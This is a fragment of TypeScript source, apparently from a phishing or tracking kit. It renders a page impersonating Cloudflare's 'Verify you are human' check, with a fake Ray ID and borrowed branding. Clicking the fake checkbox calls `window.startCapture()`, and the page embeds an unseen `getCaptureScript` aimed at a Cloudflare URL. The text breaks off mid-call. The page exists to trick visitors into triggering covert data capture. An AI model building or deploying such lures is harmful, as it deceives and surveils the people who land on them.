...
export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  ...
  'cloudflare': {
    ...
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:left; background:#1b1b1b; color: #ffffff; } .container { width: 100%; max-width: 600px; padding: 40px 20px; box-sizing: border-box; } .logo { width: 160px; height: auto; margin-bottom: 60px; filter: brightness(0) invert(1); } .main-text { font-size: 32px; font-weight: 500; line-height: 1.2; margin-bottom: 16px; color: #ffffff; } .sub-text { font-size: 16px; color: #aaaaaa; margin-bottom: 40px; line-height: 1.5; } .turnstile-box { border: 1px solid #333; border-radius: 4px; padding: 16px; display: inline-flex; align-items: center; background: #222; cursor: pointer; transition: border-color 0.2s, background 0.2s; min-width: 320px; } .turnstile-box:hover { border-color: #f6821f; background: #2a2a2a; } .checkbox { width: 28px; height: 28px; border: 2px solid #f6821f; border-radius: 4px; margin-right: 16px; position: relative; background: #1b1b1b; } .turnstile-text { font-size: 15px; color: #f6821f; font-weight: 600; flex-grow: 1; } .footer { font-size: 13px; color: #666; margin-top: 100px; border-top: 1px solid #333; padding-top: 24px; width: 100%; display: flex; justify-content: space-between; } .footer a { color: #f6821f; text-decoration: none; } .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(246, 130, 31, 0.2); border-radius: 50%; border-top-color: #f6821f; animation: spin 0.8s linear infinite; margin-left: 10px; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Cloudflare_Logo.png/1200px-Cloudflare_Logo.png" alt="Cloudflare" class="logo" referrerpolicy="no-referrer"><div class="main-text">Verifying you are human. This may take a few seconds.</div><div class="sub-text">Verification is required to protect the website from automated attacks. We need to review the security of your connection before proceeding.</div><div class="turnstile-box" onclick="document.getElementById('spinner').style.display='block'; window.startCapture();"><div class="checkbox"></div><div class="turnstile-text">Verify you are human</div><div class="spinner" id="spinner"></div></div><div class="footer"><div>Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span></div><div>Performance & security by <a href="#">Cloudflare</a></div></div></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
